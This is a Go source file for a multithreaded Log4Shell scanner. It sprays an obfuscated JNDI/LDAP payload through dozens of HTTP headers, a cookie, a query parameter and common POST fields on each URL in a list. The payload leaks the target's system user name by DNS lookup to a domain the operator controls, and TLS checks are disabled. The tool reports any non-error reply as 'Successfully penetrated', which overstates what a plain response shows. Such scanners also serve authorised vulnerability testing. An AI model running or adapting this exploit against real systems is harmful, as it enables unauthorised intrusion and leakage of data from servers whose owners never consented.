package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	log "github.com/sirupsen/logrus"
)

var (
	debug   = flag.Bool("debug", false, "Print debug output")
	threads = flag.Int("threads", 10, "Number of threads")
	urllist = flag.String("urllist", "", "file with URLs to scan")
	domain  = flag.String("domain", "", "domain to capture dns requests")
	timeout = flag.Duration("timeout", 2*time.Second, "timeout to target")
	proxy   = flag.String("proxy", "", "proxy server to use")
)

var (
	headerNames = []string{
		"Referer",
		"X-Api-Version",
		"Accept-Charset",
		"Accept-Datetime",
		"Accept-Encoding",
		"Accept-Language",
		"Forwarded",
		"Forwarded-For",
		"Forwarded-For-Ip",
		"Forwarded-Proto",
		"From",
		"TE",
		"True-Client-IP",
		"Upgrade",
		"User-Agent",
		"Via",
		"Warning",
		"X-Api-Version",
		"Max-Forwards",
		"Origin",
		"Pragma",
		"DNT",
		"Cache-Control",
		"X-Att-Deviceid",
		"X-ATT-DeviceId",
		"X-Correlation-ID",
		"X-Csrf-Token",
		"X-CSRFToken",
		"X-Do-Not-Track",
		"X-Foo",
		"X-Foo-Bar",
		"X-Forwarded",
		"X-Forwarded-By",
		"X-Forwarded-For",
		"X-Forwarded-For-Original",
		"X-Forwarded-Host",
		"X-Forwarded-Port",
		"X-Forwarded-Proto",
		"X-Forwarded-Protocol",
		"X-Forwarded-Scheme",
		"X-Forwarded-Server",
		"X-Forwarded-Ssl",
		"X-Forwarder-For",
		"X-Forward-For",
		"X-Forward-Proto",
		"X-Frame-Options",
		"X-From",
		"X-Geoip-Country",
		"X-Http-Destinationurl",
		"X-Http-Host-Override",
		"X-Http-Method",
		"X-Http-Method-Override",
		"X-HTTP-Method-Override",
		"X-Http-Path-Override",
		"X-Https",
		"X-Htx-Agent",
		"X-Hub-Signature",
		"X-If-Unmodified-Since",
		"X-Imbo-Test-Config",
		"X-Insight",
		"X-Ip",
		"X-Ip-Trail",
		"X-ProxyUser-Ip",
		"X-Requested-With",
		"X-Request-ID",
		"X-UIDH",
		"X-Wap-Profile",
		"X-XSRF-TOKEN",
	}
	postParams = []string{
		"username",
		"user",
		"email",
		"password",
		"csrf_token",
		"id",
		"action",
		"page",
		"q",
		"search",
		"s",
		"submit",
		"message",
		"msg",
		"text",
		"login",
		"lang",
		"method",
		"data",
	}
)

type app struct {
	client       *http.Client
	wg           *sync.WaitGroup
	inChan       <-chan string
	outChan      chan<- string
	errorChan    chan<- error
	httpRequests int64
	goodRequests int64
	badRequests  int64
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randString(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	flag.Parse()

	log.SetOutput(os.Stdout)
	if *debug {
		log.SetLevel(log.DebugLevel)
	} else {
		log.SetLevel(log.InfoLevel)
	}

	if *urllist == "" {
		log.Fatal("please specify an urllist")
		return
	}

	if *domain == "" {
		log.Fatal("please specify a domain")
		return
	}

	inChan := make(chan string, *threads)
	outChan := make(chan string)
	errChan := make(chan error)

	wgMain := new(sync.WaitGroup)

	wgMain.Add(1)
	go func() {
		defer wgMain.Done()
		for err := range errChan {
			log.Error(err)
		}
	}()

	wgMain.Add(1)
	go func() {
		defer wgMain.Done()
		for msg := range outChan {
			log.Info(msg)
		}
	}()

	var proxyTransport func(*http.Request) (*url.URL, error)
	if *proxy != "" {
		proxyUrl, err := url.Parse(*proxy)
		if err != nil {
			log.Fatal(err)
			return
		}
		proxyTransport = http.ProxyURL(proxyUrl)
	}

	client := &http.Client{
		Timeout: *timeout,
		Transport: &http.Transport{
			Proxy: proxyTransport,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		}}

	app := app{
		client:    client,
		inChan:    inChan,
		outChan:   outChan,
		errorChan: errChan,
		wg:        new(sync.WaitGroup),
	}
	for i := 0; i < *threads; i++ {
		app.wg.Add(1)
		go app.worker()
	}

	file, err := os.Open(*urllist)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	// optionally, resize scanner's capacity for lines over 64K, see next example
	for scanner.Scan() {
		inChan <- scanner.Text()
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	close(inChan)
	app.wg.Wait()
	close(errChan)
	close(outChan)
	// wait for error and output channel to finish
	wgMain.Wait()
	log.Infof("Bad Requests: %d", app.badRequests)
	log.Infof("Good Requests: %d", app.goodRequests)
	log.Infof("Total Requests: %d", app.httpRequests)
}

func (a *app) worker() {
	defer a.wg.Done()
	ctx := context.Background()

	log.Debug("worker started")

	for x := range a.inChan {
		log.Debugf("Processing %s", x)
		u, err := url.Parse(x)
		if err != nil {
			a.errorChan <- err
			continue
		}
		host := fmt.Sprintf("%s.%s", u.Hostname(), *domain)
		payload := fmt.Sprintf("${${::-j}${::-n}${::-d}${::-I}:ldap://${sys:user.name}.%s/%s}", host, randString(5))
		log.Debug(payload)
		statusCode, err := a.request(ctx, http.MethodGet, x, payload, nil)
		if err != nil {
			atomic.AddInt64(&a.badRequests, 1)
			a.errorChan <- err
			continue
		}
		a.outChan <- fmt.Sprintf("Successfully penetrated with GET %s", x)
		atomic.AddInt64(&a.goodRequests, 1)

		if statusCode == 404 {
			// no need for POSTing when the site returns a 404 anyways
			continue
		}

		// now try posting
		postData := url.Values{}
		for _, p := range postParams {
			postData.Set(p, payload)
		}

		_, err = a.request(ctx, http.MethodPost, x, payload, strings.NewReader(postData.Encode()))
		if err != nil {
			atomic.AddInt64(&a.badRequests, 1)
			a.errorChan <- err
			continue
		}

		a.outChan <- fmt.Sprintf("Successfully penetrated with POST %s", x)
		atomic.AddInt64(&a.goodRequests, 1)
	}

	log.Debug("worker done")
}

func (a *app) request(ctx context.Context, method, url, payload string, body io.Reader) (int, error) {
	r, err := http.NewRequestWithContext(ctx, method, url, body)
	if err != nil {
		return -1, err
	}

	for _, h := range headerNames {
		r.Header.Set(h, payload)
	}

	r.AddCookie(&http.Cookie{
		Name:    "JSESSIONID",
		Value:   payload,
		Path:    "/",
		Expires: time.Now().Add(8760 * time.Hour),
	})

	q := r.URL.Query()
	q.Add("DEBUG", "true")
	q.Add("Parameter", payload)
	r.URL.RawQuery = q.Encode()

	r.Header.Set("Connection", "close")
	r.Header.Set("Accept", "*/*")

	if method == http.MethodPost {
		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	resp, err := a.client.Do(r)
	if err != nil {
		return -1, err
	}
	defer resp.Body.Close()
	_, err = io.Copy(io.Discard, resp.Body)
	if err != nil {
		return -1, err
	}

	atomic.AddInt64(&a.httpRequests, 1)

	return resp.StatusCode, nil
}
